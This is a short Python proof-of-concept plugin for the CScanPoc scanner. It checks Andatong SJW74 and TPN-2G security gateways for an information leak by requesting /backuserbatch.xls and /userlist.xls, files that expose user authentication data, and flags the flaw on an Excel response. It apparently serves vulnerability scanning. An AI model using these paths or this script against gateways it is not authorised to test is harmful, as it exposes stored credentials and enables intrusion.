# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'ADTsec_0004'  # 平台漏洞编号，留空
    name = '安达通安全网关 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        SJW74系列安全网关 和 全网行为管理TPN-2G安全网关 2处认证信息泄露 。
        /backuserbatch.xls
        /userlist.xls
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '安全网关'  # 漏洞应用名称
    product_version = '安达通全网行为管理'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'b2f90b12-69c8-4934-808a-67f8881e60b3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            payloads = ['/backuserbatch.xls', '/userlist.xls']
            for payload in payloads:  
                url = arg + payload
                code, head, res, errcode, _ = hh.http(url)

                if code==200 and 'vnd.ms-excel' in head:
                    #security_warning(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()